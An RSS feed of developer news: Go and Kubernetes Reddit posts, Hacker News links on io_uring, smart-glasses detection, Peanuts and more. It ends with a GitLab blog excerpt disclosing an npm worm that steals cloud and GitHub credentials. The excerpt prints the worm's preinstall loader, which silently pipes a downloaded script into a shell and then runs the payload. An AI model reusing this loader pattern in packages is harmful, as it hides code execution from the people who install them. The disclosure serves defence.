<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Dev News</title><link>https://konrad.website/liveboat-github-runner/</link><description></description><item><title>Built a Git assistant CLI in Go</title><link>https://www.reddit.com/r/golang/comments/1p8py8j/built_a_git_assistant_cli_in_go/</link><author>/u/llyas__</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Fri, 28 Nov 2025 08:40:55 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I've been working on a lightweight Git assistant CLI in Go, inspired by tools like GitHub Copilot but focused on simplifying everyday Git tasks. It’s called , and it supports commands like showing the current branch, commit info, repo status, and even generating AI‑powered commit messages using OpenRouter.]]></content:encoded></item><item><title>When do Go processes return idle memory back to the OS?</title><link>https://www.reddit.com/r/golang/comments/1p8ovc7/when_do_go_processes_return_idle_memory_back_to/</link><author>/u/DeparturePrudent3790</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Fri, 28 Nov 2025 07:30:40 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[My understanding is after a GC the spans which have no reachable objects are marked as idle and remain with the go process for future allocations. This is leading to overall memory usage of the process to be high by 50% that wants needed. I want to understand by default when does the go process return the idle memory to the OS? ]]></content:encoded></item><item><title>Show HN: Glasses to detect smart-glasses that have cameras</title><link>https://github.com/NullPxl/banrays</link><author>nullpxl</author><category>dev</category><category>hn</category><pubDate>Fri, 28 Nov 2025 05:52:38 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Hi! Recently smart-glasses with cameras like the Meta Ray-bans seem to be getting more popular. As does some people's desire to remove/cover up the recording indicator LED. I wanted to see if there's a way to detect when people are recording with these types of glasses, so a little bit ago I started working this project. I've hit a little bit of a wall though so I'm very much open to ideas!I've written a bunch more on the link (+photos are there), but essentially this uses 2 fingerprinting approaches: 
- retro-reflectivity of the camera sensor by looking at IR reflections. mixed results here.
- wireless traffic (primarily BLE, also looking into BTC and wifi)For the latter, I'm currently just using an ESP32, and I can consistently detect when the Meta Raybans are 1) pairing, 2) first powered on, 3) (less consistently) when they're taken out of the charging case. When they do detect something, it plays a little jingle next to your ear.Ideally I want to be able to detect them when they're in use, and not just at boot. I've come across the nRF52840, which seems like it can follow directed BLE traffic beyond the initial broadcast, but from my understanding it would still need to catch the first CONNECT_REQ event regardless. On the bluetooth classic side of things, all the hardware looks really expensive! Any ideas are appreciated. Thanks!]]></content:encoded></item><item><title>Go Pooling Strategies: sync.Pool vs Generics vs ResettablePool — Benchmarks and Takeaways</title><link>https://www.reddit.com/r/golang/comments/1p8n0y2/go_pooling_strategies_syncpool_vs_generics_vs/</link><author>/u/LearnedByError</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Fri, 28 Nov 2025 05:40:34 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I have been working on a web photo gallery personal project and playing with various A.I. as programming assistants. I have recently completed all of the features for my first release with most of the code constructed in conjunction with Gemini CLI and a portion from Claude Sonnet 4.5.The vast majority of the code uses stdlib with a few 3rd party packages for SQLite database access and http sessions. The code can generally be broken into two categories: Web Interface and Server (HTMX/Hyperscript using TailwindCSS and DaisyUI served by net/http) and Image Ingestion. The dev process was traditional. Get working code first. If performance is a problem, profile and adjust.The web performance tricks were primarily on the front-end.  and  worked admirably well with bog standard code.The Image Ingestion code is where most of the performance improvement time was spent. It contains a worker pool curated to work as well as possible over different hardware (small to large), a custom  connection pool to over come some performance limitation of the stdlib pool, and heavily leverages sync.Pool to minimize allocation overhead.I asked Copilot in VSCode to perform a Code Review. I was a bit surprised with its result. It was quite good. Many of the issues that it identified, like insufficient negative testing, I expected.I did not expect it to recommend replacing my use of sync.Pool with generic versions for type safety and possible performance improvement. My naive pre-disposition has been to "not" use generics where performance is a concern. Nonetheless, this raised my curiosity. I asked Copilot to write benchmarks to compare the implementations.The benchmark implementations are:Interface-based  using pointer indirection (e.g., , , ).Generics-based pools:  storing values (e.g.,  by value). storing pointers (e.g., , ).A minimal  abstraction (calls  automatically on ) versus generic pointer pools, for types that can cheaply reset.Link to benchmarks below.Interface pointer ()Generic value slice ()Interface pointer ()Generic value slice ()galleryImage (RGBA 1920x1080)galleryImage (RGBA 1920x1080)galleryImage (RGBA 1920x1080)galleryImage (RGBA 1920x1080)These benchmarks were run on my dev server: Intel(R) Xeon(R) CPU E5-2680 v3 @ 2.50GHz (Linux, Go on amd64).For slices, a generic value pool () incurs allocations (value copy semantics). Prefer interface pointer pools () or a generic pointer pool to avoid allocations.For pointer types (, ), both interface and generic pointer pools are allocation-free and perform similarly.For  (Resettable), both approaches are zero-alloc; minor speed differences were observed - not significantFor large/complex objects ( which is image.Image wrapped in a struck), a generic pointer pool was ~2× faster than  in these tests, likely due to reduced interface overhead and reset work pattern.go test -bench . -benchmem -run '^$' go test -bench 'BufPool' -benchmem -run '^$' go test -bench 'BufferPool' -benchmem -run '^$' go test -bench 'Null(String|Int64)Pool_(GetPut|Parallel)$' -benchmem -run '^$' go test -bench 'MD5_(GetPut|Parallel)$' -benchmem -run '^$' go test -bench 'GalleryImage_(GetPut|Parallel)$' -benchmem -run '^$' Pools are powerful. Details matter! Use pointer pools. Avoid value slice pools. Expect parity across strategies (interface/generic) for pointer to small types. Generic may be faster is the type is large. And as always, benchmark your actual workloads. Relative performance can shift with different reset logic and usage patterns.I hope you find this informative. I did.]]></content:encoded></item><item><title>Pocketbase – open-source realtime back end in 1 file</title><link>https://pocketbase.io/</link><author>modinfo</author><category>dev</category><category>hn</category><pubDate>Fri, 28 Nov 2025 03:45:04 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Manage your app users and handle email/password and OAuth2 sign ups (Google,
                            Facebook, GitHub, GitLab) without the hassle.]]></content:encoded></item><item><title>Smarter Scheduling for AI Workloads: Topology-Aware Scheduling</title><link>https://www.reddit.com/r/kubernetes/comments/1p8ku4a/smarter_scheduling_for_ai_workloads_topologyaware/</link><author>/u/Electronic_Role_5981</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Fri, 28 Nov 2025 03:39:48 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[TL;DR — Topology-Aware Scheduling (Simple Summary)AI workloads need good hardware placement. GPUs, CPUs, memory, PCIe/NVLink all have different “distances.” Bad placement can waste 30–50% performance.Traditional scheduling isn’t enough. Kubernetes normally just counts GPUs. It doesn’t understand NUMA, PCIe trees, NVLink rings, or network topology.Topology-Aware Scheduling fixes this. The scheduler becomes aware of full hardware layout so it can place pods where GPUs and NICs are closest.DRA (Dynamic Resource Allocation) These let Kubernetes make smarter placement choices.Simple single-GPU jobs → normal scheduling is fine.Multi-GPU or distributed training → topology-aware scheduling gives big performance gains   submitted by    /u/Electronic_Role_5981 ]]></content:encoded></item><item><title>How Charles M Schulz created Charlie Brown and Snoopy (2024)</title><link>https://www.bbc.com/culture/article/20241205-how-charles-m-schulz-created-charlie-brown-and-snoopy</link><author>1659447091</author><category>dev</category><category>hn</category><pubDate>Fri, 28 Nov 2025 00:10:38 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Charles M Schulz drew his beloved Peanuts strip for 50 years until his announcement on 14 December 1999 that ill health was forcing him to retire. In History looks at how an unassuming cartoonist built a billion-dollar empire out of the lives of a group of children, a dog and a bird.Charles M Schulz's timeless creation Charlie Brown may have been as popular as any character in all of literature, but the cartoonist was modest about the scope of his miniature parables. In a 1977 BBC interview, he said: "I'm talking only about the minor everyday problems in life. Leo Tolstoy dealt with the major problems of the world. I'm only dealing with why we all have the feeling that people don't like us."  This did not mean that he felt as if he was dealing with trivial matters. He said: "I'm always very much offended when someone asks me, 'Do I ever do satire on the social condition?' Well, I do it almost every day. And they say, 'Well, do you ever do political things?' I say, 'I do things which are more important than politics. I'm dealing with love and hate and mistrust and fear and insecurity.'"  WATCH: 'Cartooning is drawing funny pictures whether they're silly or rather meaningful political cartoons'.While Charlie Brown may have been the eternal failure, the universal feelings that Schulz channelled helped make Peanuts a global success. Born in 1922, Schulz drew every single Peanuts strip himself from 1950 until his death in February 2000. It was so popular that Nasa named two of the modules in its May 1969 Apollo 10 lunar mission after Charlie Brown and Snoopy. The strip was syndicated in more than 2,600 newspapers worldwide, and inspired films, music and countless items of merchandise. Part of its success, according to the writer Umberto Eco, was that it worked on different levels. He wrote: "Peanuts charms both sophisticated adults and children with equal intensity, as if each reader found there something for himself, and it is always the same thing, to be enjoyed in two different keys. Peanuts is thus a little human comedy for the innocent reader and for the sophisticated." Schulz's initial reason for focusing on children in the strip was strictly commercial. In 1990, he told the BBC: "I always hate to say it, but I drew little kids because this is what sold. I wanted to draw something, I didn't know what it was, but it just seemed as if whenever I drew children, these were the cartoons that editors seemed to like the best. And so, back in 1950, I mailed a batch of cartoons to New York City, to United Features Syndicate, and they said they liked them, and so ever since I've been drawing little kids."  ]]></content:encoded></item><item><title>developing k8s operators</title><link>https://www.reddit.com/r/kubernetes/comments/1p8gmv6/developing_k8s_operators/</link><author>/u/TraditionalJaguar844</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Fri, 28 Nov 2025 00:00:05 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[I’m doing some research on how people and teams are using Kubernetes Operators and what might be missing.I’d love to hear about your experience and opinions:Which operators are you using today? Which of them are running in production vs non-prod?Have you ever needed an operator that didn’t exist? How did you handle it — scripts, GitOps hacks, Helm templating, manual ops?Have you considered writing your own custom operator? If yes, why? if you didn't do it, what stopped you ? If you could snap your fingers and have a new Operator exist today, what would it do?Trying to understand the gap between what exists and what teams really need day-to-day.Thanks! Would love to hear your thoughts   submitted by    /u/TraditionalJaguar844 ]]></content:encoded></item><item><title>Vsora Jotunn-8 5nm European inference chip</title><link>https://vsora.com/products/jotunn-8/</link><author>rdg42</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 23:30:11 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[To provide the best experiences, we use technologies like cookies to store and/or access device information. Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. Not consenting or withdrawing consent, may adversely affect certain features and functions.]]></content:encoded></item><item><title>250MWh &apos;Sand Battery&apos; to start construction in Finland</title><link>https://www.energy-storage.news/250mwh-sand-battery-to-start-construction-in-finland-for-both-heating-and-ancillary-services/</link><author>doener</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 22:48:44 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A programmer-friendly I/O abstraction over io_uring and kqueue (2022)</title><link>https://tigerbeetle.com/blog/2022-11-23-a-friendly-abstraction-over-iouring-and-kqueue/</link><author>enz</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 22:41:06 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Consider this tale of I/O and performance. We’ll start with blocking
I/O, explore io_uring and kqueue, and take home an event loop very
similar to some software you may find familiar.When you want to read from a file you might  and
then call  as many times as necessary to fill a
buffer of bytes from the file. And in the opposite direction, you call
 as many times as needed until everything is
written. It’s similar for a TCP client with sockets, but instead of
 you first call  and then
 to your server. Fun stuff.In the real world though you can’t always read everything you want
immediately from a file descriptor. Nor can you always write everything
you want immediately to a file descriptor.You can switch
a file descriptor into non-blocking mode so the call won’t block
while data you requested is not available. But system calls are still
expensive, incurring context switches and cache misses. In fact,
networks and disks have become so fast that these costs can start to
approach the cost of doing the I/O itself. For the duration of time a
file descriptor is unable to read or write, you don’t want to waste time
continuously retrying read or write system calls.So you switch to io_uring on Linux or kqueue on FreeBSD/macOS. (I’m
skipping the generation of epoll/select users.) These APIs let you
submit requests to the kernel to learn about readiness: when a file
descriptor is ready to read or write. You can send readiness requests in
batches (also referred to as queues). Completion events, one for each
submitted request, are available in a separate queue.Being able to batch I/O like this is especially important for TCP
servers that want to multiplex reads and writes for multiple connected
clients.However in io_uring, you can even go one step further. Instead of
having to call  or  in userland
after a readiness event, you can request that the kernel do the
 or  itself with a buffer you
provide. Thus almost all of your I/O is done in the kernel, amortizing
the overhead of system calls.If you haven’t seen io_uring or kqueue before, you’d probably like an
example! Consider this code: a simple, minimal, not-production-ready TCP
echo server.This is a great, minimal example. But notice that this code ties
io_uring behavior directly to business logic (in this case, handling
echoing data between request and response). It is fine for a small
example like this. But in a large application you might want to do I/O
throughout the code base, not just in one place. You might not want to
keep adding business logic to this single loop.Instead, you might want to be able to schedule I/O and pass a
callback (and sometimes with some application context) to be called when
the event is complete.The interface might look like:This is great! Now your business logic can schedule and handle I/O no
matter where in the code base it is.Under the hood it can decide whether to use io_uring or kqueue
depending on what kernel it’s running on. The dispatch can also batch
these individual calls through io_uring or kqueue to amortize system
calls. The application no longer needs to know the details.Additionally, we can use this wrapper to stop thinking about
readiness events, just I/O completion. That is, if we dispatch a read
event, the io_uring implementation would actually ask the kernel to read
data into a buffer. Whereas the kqueue implementation would send a
“read” readiness event, do the read back in userland, and then call our
callback.And finally, now that we’ve got this central dispatcher, we don’t
need spaghetti code in a loop switching on every possible submission and
completion event.Every time we call io_uring or kqueue we both submit event requests
and poll for completion events. The io_uring and kqueue APIs tie these
two actions together in the same system call.To sync our requests to io_uring or kqueue we’ll build a
 function that submits requests and polls for
completion events. (In the next section we’ll talk about how the user of
the central dispatch learns about completion events.)To make  more convenient, we’ll build a nice
wrapper around it so that we can submit as many requests (and process as
many completion events) as possible. To avoid accidentally blocking
indefinitely we’ll also introduce a time limit. We’ll call the wrapper
.Finally we’ll put the user in charge of setting up a loop to call
this  function, independent of normal program
execution.This is now your traditional event loop.You may have noticed that in the API above we passed a callback. The
idea is that after the requested I/O has completed, our callback should
be invoked. But the question remains: how to track this callback between
the submission and completion queue?Thankfully, io_uring and kqueue events have user data fields. The
user data field is opaque to the kernel. When a submitted event
completes, the kernel sends a completion event back to userland
containing the user data value from the submission event.We can store the callback in the user data field by setting it to the
callback’s pointer casted to an integer. When the completion for a
requested event comes up, we cast from the integer in the user data
field back to the callback pointer. Then, we invoke the callback.As described above, the struct for 
could get quite large handling all the different kinds of I/O events and
their arguments. We could make our API a little more expressive by
creating wrapper functions for each event type.So if we wanted to schedule a read function we could call:One more thing we need to worry about is that the batch we pass to
io_uring or kqueue has a fixed size (technically, kqueue allows any
batch size but using that might introduce unnecessary allocations). So
we’ll build our own queue on top of our I/O abstraction to keep track of
requests that we could not immediately submit to io_uring or kqueue.To keep this API simple we could allocate for each entry in the
queue. Or we could modify the  calls slightly
to accept a struct that can be used in an intrusive
linked list to contain all request context, including the callback.
The latter is what
we do in TigerBeetle.Put another way: every time code calls ,
we’ll try to immediately submit the requested event to io_uring or
kqueue. But if there’s no room, we store the event in an overflow
queue.The overflow queue needs to be processed eventually, so we update our
 function (described in Callbacks and context above) to pull
as many events from our overflow queue before submitting a batch to
io_uring or kqueue.We’ve now built something similar to libuv, the I/O library that
Node.js uses. And if you squint, it is basically TigerBeetle’s I/O
library! (And interestingly enough, TigerBeetle’s I/O code was adopted
into Bun! Open-source for the win!)Let’s check out how the Darwin
version of TigerBeetle’s I/O library (with kqueue) differs from the
Linux
version. As mentioned, the complete  call in the
Darwin implementation waits for file descriptor readiness (through
kqueue). Once ready, the actual  call is made back in
userland:Compare this to the Linux
version (with io_uring) where the kernel handles everything and
there is no send system call in userland:Similarly, take a look at  on Linux
and macOS
for event processing. Look at  on Linux
and macOS
for the public API users must call. And finally, look at what puts this
all into practice, the loop calling  in
src/main.zig.We’ve come this far and you might be wondering — what about
cross-platform support for Windows? The good news is that Windows also
has a completion based system similar to io_uring but without batching,
called IOCP.
And for bonus points, TigerBeetle provides the same
I/O abstraction over it! But it’s enough to cover just Linux and
macOS in this post. :)In both this blog post and in TigerBeetle, we implemented a
single-threaded event loop. Keeping I/O code single-threaded in
userspace is beneficial (whether or not I/O processing is
single-threaded in the kernel is not our concern). It’s the simplest
code and best for workloads that are not embarrassingly parallel. It is
also best for determinism, which is integral to the design of
TigerBeetle because it enables us to do Deterministic Simulation
TestingBut there are other valid architectures for other workloads.For workloads that are embarrassingly parallel, like many web
servers, you could instead use multiple threads where each thread has
its own queue. In optimal conditions, this architecture has the highest
I/O throughput possible.But if each thread has its own queue, individual threads can become
starved if an uneven amount of work is scheduled on one thread. In the
case of dynamic amounts of work, the better architecture would be to
have a single queue but multiple worker threads doing the work made
available on the queue.Hey, maybe we’ll split this out so you can use it too. It’s written
in Zig so we can easily expose a C API. Any language with a C foreign
function interface (i.e. every language) should work well with it. Keep
an eye on our GitHub.
:)]]></content:encoded></item><item><title>WebScraping in golang</title><link>https://www.reddit.com/r/golang/comments/1p8dg89/webscraping_in_golang/</link><author>/u/North_Fall_8333</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Thu, 27 Nov 2025 21:24:09 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Is webscraping in go a good idea? I'm used to using playwright and selenium for webscraping in java/kotlin but i've been focusing on learning golang recently is this a good idea and if yes than what should I use for it?   submitted by    /u/North_Fall_8333 ]]></content:encoded></item><item><title>Underrated reasons to be thankful V</title><link>https://dynomight.net/thanks-5/</link><author>numeri</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 20:37:51 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[That your dog, while she appears to love you only because she’s been adapted by evolution to appear to love you, really does love you.That if you’re a life form and you cook up a baby and copy your genes to them, you’ll find that the genes have been degraded due to oxidative stress et al., which isn’t cause for celebration, but if you find some other hopefully-hot person and randomly swap in half of their genes, your baby will still be somewhat less fit compared to you and your hopefully-hot friend on average, but now there is variance, so if you cook up several babies, one of them might be as fit or even fitter than you, and that one will likely have more babies than your other babies have, and thus complex life can persist in a universe with increasing entropy.That if we wanted to, we surely  figure out which of the 300-ish strains of rhinovirus are circulating in a given area at a given time and rapidly vaccinate people to stop it and thereby finally “cure” the common cold, and though this is too annoying to pursue right now, it seems like it’s just a matter of time.That if you look back at history, you see that plagues went from Europe to the Americas but not the other way, which suggests that urbanization and travel are great allies for infectious disease, and these both continue today but are held in check by sanitation and vaccines even while we have lots of tricks like UVC light and high-frequency sound and air filtration and waste monitoring and paying people to stay home that we’ve barely even put in play.That while engineered infectious diseases loom ever-larger as a potential very big problem, we also have lots of crazier tricks we  pull out like panopticon viral screening or toilet monitors or daily individualized saliva sampling or engineered microbe-resistant surfaces or even dividing society into cells with rotating interlocks or having people walk around in little personal spacesuits, and while admittedly most of this doesn’t sound awesome, I see no reason this shouldn’t be a battle that we would win.That clean water, unlimited, almost free.That radioactive atoms either release a ton of energy but also quickly stop existing—a gram of Rubidium-90 scattered around your kitchen emits as much energy as ~200,000 incandescent lightbulbs but after an hour only 0.000000113g is left—or don’t put out very much energy but keep existing for a long time—a gram of Carbon-14 only puts out the equivalent of 0.0000212 light bulbs but if you start with a gram, you’ll still have 0.999879g after a year—so it isn’t actually  easy to permanently poison the environment with radiation although Cobalt-60 with its medium energy output and medium half-life is unfortunate, medical applications notwithstanding I still wish Cobalt-60 didn’t exist, screw you Cobalt-60.That while curing all cancer would only increase life expectancy by ~3 years and curing all heart disease would only increase life expectancy by ~3 years, and preventing all accidents would only increase life expectancy by ~1.5 years, if we did all of these at the same time and then a lot of other stuff too, eventually the effects would go nonlinear, so trying to cure cancer isn’t actually a waste of time, thankfully.That the peroxisome, while the mitochondria and their stupid Krebs cycle get all the attention, when a fatty-acid that’s too long for them to catabolize comes along, who you gonna call.That we have preferences, that there’s no agreed ordering of how good different things are, which is neat, and not something that would obviously be true for an alien species, and given our limited resources probably makes us happier on net.That cardamom, it is cheap but tastes expensive, if cardamom cost 1000× more, people would brag about how they flew to Sri Lanka so they could taste chai made with fresh cardamom and swear that it changed their whole life.That Gregory of Nyssa, he was right.That Grandma Moses, it’s not too late.That sleep, that probably evolution first made a low-energy mode so we don’t starve so fast and then layered on some maintenance processes, but the effect is that we live in a cycle and when things aren’t going your way it’s comforting that reality doesn’t stretch out before you indefinitely but instead you can look forward to a reset and a pause that’s somehow neither experienced nor skipped.That, glamorous or not, comfortable or not, cheap or not, carbon emitting or not, air travel is very safe.That, for most of the things you’re worried about, the markets are less worried than you and they have the better track record, though not the issue of your mortality.That sexual attraction to romantic love to economic unit to reproduction, it’s a strange bundle, but who are we to argue with success.That every symbolic expression recursively built from differentiable elementary functions has a derivative that can also be written as a recursive combination of elementary functions, although the latter expression may require vastly more terms.That every expression graph built from differentiable elementary functions and producing a scalar output has a gradient that can itself be written as an expression graph, and furthermore that the latter expression graph is always the same size as the first one and is easy to find, and thus that it’s possible to fit very large expression graphs to data.That, eerily, biological life and biological intelligence does not appear to make use of that property of expression graphs.That if you look at something and move your head around, you observe the entire light field, which is a five-dimensional function of three spatial coordinates and two angles, and yet if you do something fancy with lasers, somehow that entire light field can be stored on a single piece of normal two-dimensional film and then replayed later.That, as far as I can tell, the reason five-dimensional light fields can be stored on two-dimensional film simply cannot be explained without quite a lot of wave mechanics, a vivid example of the strangeness of this place and proof that all those physicists with their diffractions and phase conjugations really are up to something.That disposable plastic, littered or not, harmless when consumed as thousands of small particles or not, is popular for a reason.That disposable plastic, when disposed of correctly, is literally carbon sequestration, and that if/when air-derived plastic replaces dead-plankton-derived plastic, this might be incredibly convenient, although it must be said that currently the carbon in disposable plastic only represents a single-digit percentage of total carbon emissions.That rocks can be broken into pieces and then you can’t un-break the pieces but you can check that they came from the same rock, it’s basically cryptography.That the deal society has made is that if you have kids then everyone you encounter is obligated to chip in a bit to assist you, and this seems to mostly work without the need for constant grimy negotiated transactions as Econ 101 would suggest, although the exact contours of this deal seem to be a bit murky.That of all the humans that have ever lived, the majority lived under some kind of autocracy, with the rest distributed among tribal bands, chiefdoms, failed states, and flawed democracies, and only something like 1% enjoyed free elections and the rule of law and civil liberties and minimal corruption, yet we endured and today that number is closer to 10%, and so if you find yourself outside that set, do not lose heart.That if you were in two dimensions and you tried to eat something then maybe your body would split into two pieces since the whole path from mouth to anus would have to be disconnected, so be thankful you’re in three dimensions, although maybe you could have some kind of jigsaw-shaped digestive tract so your two pieces would only jiggle around or maybe you could use the same orifice for both purposes, remember that if you ever find yourself in two dimensions, I guess.]]></content:encoded></item><item><title>DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning [pdf]</title><link>https://github.com/deepseek-ai/DeepSeek-Math-V2/blob/main/DeepSeekMath_V2.pdf</link><author>fspeech</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 20:03:25 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>3rd party package for doing symmetric AES encryption?</title><link>https://www.reddit.com/r/golang/comments/1p8ahvb/3rd_party_package_for_doing_symmetric_aes/</link><author>/u/trymeouteh</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Thu, 27 Nov 2025 19:13:44 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Is there a simple to use, popular and well trusted package that makes AES CBC and AES GCM encryption and decryption simple without having to work with cipher blocks?I am fine with having to generate a salt, iv, key on my own. Would like something more basic for encrypting and decryption.]]></content:encoded></item><item><title>Running Kubernetes in the homelab</title><link>https://www.reddit.com/r/kubernetes/comments/1p89ywo/running_kubernetes_in_the_homelab/</link><author>/u/AlertKangaroo6086</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Thu, 27 Nov 2025 18:51:31 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[I’ve been wanting to dip my toes into Kubernetes recently after making a post over at r/homelabIt’s been on a list of things to do for years now, but I am a bit lost on where to get started. There’s so much content out there regarding Kubernetes - some of which involves running nodes on VMs via Proxmox (this would be great for my set up whilst I get settled)Does anyone here run Kubernetes for their lab environment? Many thanks!]]></content:encoded></item><item><title>AI CEO – Replace your boss before they replace you</title><link>https://replaceyourboss.ai/</link><author>_tk_</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 18:37:41 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Automating Talos on Proxmox with Self-Hosted Sidero Omni (Declarative VMs + K8s)</title><link>https://www.reddit.com/r/kubernetes/comments/1p87rdz/automating_talos_on_proxmox_with_selfhosted/</link><author>/u/aceofskies05</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Thu, 27 Nov 2025 17:20:39 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[I’ve been testing out  (running self-hosted) combined with their new Proxmox Infrastructure Provider, and it has completely simplified how I bootstrap clusters. I've probably tried over 10+ way to bootstrap / setup k8s and this method is by far my favorite. There is a few limitations as the Proxmox Infra Provider is in beta technically. The biggest benefit I found is that I didn't need to touch Terraform, Ansible, or manual VM templates. Because Omni integrates directly with the Proxmox API, it handles the infrastructure provisioning and the Kubernetes bootstrapping in one go.I recorded a walkthrough of the setup showing how to:Run Sidero Omni self-hosted (I'm running it via Docker)Register Proxmox as a provider directly in the UI/CLIDefine "Machine Classes" (templates for Control Plane/Worker/GPU nodes)Spin up the VMs and install Talos automatically without external tools]]></content:encoded></item><item><title>NornicDB - drop-in replacement for neo4j - MIT - GPU accelerated vector embeddings - golang native - 2-10x faster</title><link>https://www.reddit.com/r/golang/comments/1p87hko/nornicdb_dropin_replacement_for_neo4j_mit_gpu/</link><author>/u/Dense_Gate_5193</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Thu, 27 Nov 2025 17:09:45 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[timothyswt/nornicdb-amd64-cuda:latesttimothyswt/nornicdb-arm64-metal:latesti just pushed up a Cuda/metal enabled image that will auto detect if you have a GPU mounted to the container, or locally when you build it from the repo i have been running neo4j’s benchmarks for fastrp and northwind. Id like to see what other people can do with it i’m gonna push up an apple metal image soon. (edit: done! see above) the overall performance from enabling metal on my M3 Max was 43% across the board. initial estimates have me sitting anywhere from 2-10x faster performance than neo4jedit: adding metal image tag edit2: just realize metal isn’t accessible in docker but if you build and run the binary locally it has metal active ]]></content:encoded></item><item><title>Pakistan says rooftop solar output to exceed grid demand in some hubs next year</title><link>https://www.reuters.com/sustainability/boards-policy-regulation/pakistan-says-rooftop-solar-output-exceed-grid-demand-some-hubs-next-year-2025-11-22/</link><author>toomuchtodo</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 16:42:40 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Same-day upstream Linux support for Snapdragon 8 Elite Gen 5</title><link>https://www.qualcomm.com/developer/blog/2025/10/same-day-snapdragon-8-elite-gen-5-upstream-linux-support</link><author>mfilion</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 16:19:03 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>GitLab discovers widespread NPM supply chain attack</title><link>https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/</link><author>OuterVale</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 15:36:56 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the "Shai-Hulud" malware.Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a "" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:Harvests credentials from GitHub, npm, AWS, GCP, and AzureExfiltrates stolen data to attacker-controlled GitHub repositoriesPropagates by automatically infecting other packages owned by victimsContains a destructive payload that triggers if the malware loses access to its infrastructureWhile we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.Technical analysis: How the attack unfolds The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified  with a preinstall script pointing to . This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.// This file gets added to victim's packages as setup_bun.js
#!/usr/bin/env node
async function downloadAndSetupBun() {
  // Downloads and installs bun
  let command = process.platform === 'win32' 
    ? 'powershell -c "irm bun.sh/install.ps1|iex"'
    : 'curl -fsSL https://bun.sh/install | bash';
  
  execSync(command, { stdio: 'ignore' });
  
  // Runs the actual malware
  runExecutable(bunPath, ['bun_environment.js']);
}
